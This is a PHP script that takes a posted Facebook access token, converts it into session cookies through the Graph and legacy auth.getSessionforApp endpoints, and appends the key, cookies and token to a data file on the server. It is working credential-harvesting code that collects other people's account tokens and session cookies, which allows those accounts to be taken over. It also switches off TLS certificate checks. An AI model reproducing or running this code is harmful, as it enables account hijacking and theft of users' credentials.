<?php
include_once '../lib/functions.php';

if(isset($_POST['token'])){
	$check = generate_cookie($_POST['token']);
	$res = array(
		'status' => 'error',
		'key' => ''
	);
	if($check['status'] == 'success'){
		$key_rand = random_str('alpha',20).'==';
		$fp = fopen('../data/facebook.txt', 'a') or exit('Unable to open file!');	
		$string = $key_rand.'|'.$check['cookie'].'|'.$_POST['token']."\n";
		fwrite($fp, $string);
		fclose($fp);
		$res['status'] = 'success';
		$res['key'] = $key_rand;
	}
	echo json_encode($res);
}

function generate_cookie($token){
  $response = array(
    'status' => 'error',
    'cookie' => ''
  );
  $url_check = 'https://graph.facebook.com/app?access_token='.$token;
  $get = json_decode(curl($url_check));
  if(isset($get->error)){
    return $response;
  }
  $url_cookie = 'https://api.facebook.com/method/auth.getSessionforApp?access_token='.$token.'&format=json&new_app_id='.$get->id.'&generate_session_cookies=1';
  $get_cookie = file_get_contents($url_cookie);
  $json = json_decode($get_cookie);
  if(isset($json->error_code)){
  	return $response;
  }
  $cookies = '';
  foreach ($json->session_cookies as $value) {
    $cookies .= $value->name.'='.$value->value.';';
  }
  $response['status'] = 'success';
  $response['cookie'] = $cookies;
  return $response;
}

function curl($url) {
	$ch = @curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	$head[] = "Connection: keep-alive";
	$head[] = "Keep-Alive: 300";
	$head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
	$head[] = "Accept-Language: en-us,en;q=0.5";
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36');
	curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
	$page = curl_exec($ch);
	curl_close($ch);
	return $page;
}